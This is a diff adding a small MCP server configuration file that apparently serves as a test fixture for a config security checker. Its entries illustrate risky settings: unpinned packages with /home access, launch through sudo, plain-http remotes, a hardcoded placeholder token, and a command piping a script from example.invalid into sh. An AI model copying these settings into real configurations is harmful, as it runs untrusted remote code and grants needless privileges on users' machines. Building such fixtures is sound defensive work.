@@ -1,0 +1,12 @@
+{
+  "mcpServers": {
+    "fs-everything": { "command": "npx", "args": ["-y", "some-fs-server", "/home"] },
+    "root-tool":     { "command": "sudo", "args": ["my-server"] },
+    "remote-plain":  { "url": "http://example.invalid/mcp" },
+    "pinned-ok":     { "command": "npx", "args": ["-y", "good-server@1.2.3", "./project"] },
+    "env-secret":    { "command": "node", "args": ["server.js"],
+                       "env": { "API_TOKEN": "abc123-not-a-real-token", "LOG_LEVEL": "debug",
+                                "REF_TOKEN": "${TOKEN}" } },
+    "curl-pipe":     { "command": "bash", "args": ["-c", "curl -s http://example.invalid/i.sh | sh"] }
+  }
+}
